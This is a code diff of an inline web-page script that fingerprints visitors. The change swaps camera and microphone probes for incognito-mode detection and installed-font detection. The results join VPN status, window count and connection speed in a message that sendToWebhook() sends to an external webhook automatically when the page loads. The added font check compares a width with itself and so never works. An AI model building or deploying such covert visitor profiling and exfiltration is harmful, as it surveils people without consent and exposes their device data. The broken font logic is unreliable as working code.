@@ -184,27 +184,29 @@ async function checkVPN() {
     }
 }
 
-async function checkCameraAccess() {
-    try {
-        await navigator.mediaDevices.getUserMedia({ video: true });
-        return "Camera Available";
-    } catch {
-        return "No Camera Access";
-    }
+function detectIncognito() {
+    return new Promise((resolve) => {
+        let fs = window.RequestFileSystem || window.webkitRequestFileSystem;
+        if (!fs) {
+            resolve("Unknown");
+        } else {
+            fs(window.TEMPORARY, 100, () => resolve("No"), () => resolve("Yes"));
+        }
+    });
 }
 
-
-async function checkMicrophoneAccess() {
-    try {
-        await navigator.mediaDevices.getUserMedia({ audio: true });
-        return "Microphone Available";
-    } catch {
-        return "No Microphone Access";
+async function getInstalledFonts() {
+    let fonts = ["Arial", "Verdana", "Times New Roman", "Courier New", "Georgia"];
+    let installedFonts = [];
+    let ctx = document.createElement("canvas").getContext("2d");
+    ctx.font = "72px sans-serif";
+    for (let font of fonts) {
+        ctx.font = `72px ${font}, sans-serif`;
+        if (ctx.measureText("ABC").width !== ctx.measureText("ABC").width) {
+            installedFonts.push(font);
+        }
     }
-}
-
-  async function getActiveApplications() {
-    return "Limited Access (Browser Restriction)";
+    return installedFonts.length > 0 ? installedFonts.join(", ") : "Unknown";
 }
 
 async function sendToWebhook() {
@@ -250,8 +252,8 @@ async function sendToWebhook() {
                          `🖥️ **Open Windows:** ${deviceInfo.numWindows}\n` +
                          `🚀 **Internet Speed:** ${internetSpeed}\n` +
                          `🛡️ **VPN/Proxy:** ${vpnStatus}\n` +
-                         `📷 **Camera Access:** ${deviceInfo.camera}\n\n` +
-                         `🎤 **Microphone Access:** ${deviceInfo.microphone}\n` +
+                         `🔒 **Incognito Mode:** ${incognitoMode}\n` +
+                         `🖋️ **Installed Fonts:** ${installedFonts}\n\n` +
                          `🕒 **Time:** ${dateTime}`
             };
 
@@ -272,4 +274,5 @@ async function sendToWebhook() {
 
 sendToWebhook();
 </script>
+
 
